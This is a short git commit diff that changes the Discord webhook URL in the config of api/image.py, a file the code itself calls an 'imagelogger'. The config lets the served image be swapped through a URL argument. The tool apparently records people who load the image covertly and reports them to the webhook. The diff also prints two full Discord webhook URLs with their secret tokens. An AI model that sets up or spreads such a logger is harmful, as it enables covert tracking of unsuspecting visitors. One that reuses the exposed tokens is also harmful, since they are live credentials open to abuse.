5e8a7c345ee6adcb6544f4b688d0cb8536a48193
Jelle0546 <jellesupersnelle@gmail.com>
2025-10-19 17:13:27 +0200

    Update Discord webhook URL in config

--- api/image.py
+++ api/image.py
@@ -12,7 +12,7 @@ __author__ = "Jelle_0546"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1421620219708706979/-LFXWh7Et2hozvsNd8ZC5mMz38BfrObr9vf0fcaNFF9d2oKgrm9zoK9bdJWOYC0XA3tC",
+    "webhook": "https://discord.com/api/webhooks/1429487482344312842/f2pkd_TdoAMcK4i6G4Vo4-_gDfyk48CXXhrv2pd7sLm52jag04V2KYi2JOfBNWy5CLjt",
     "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
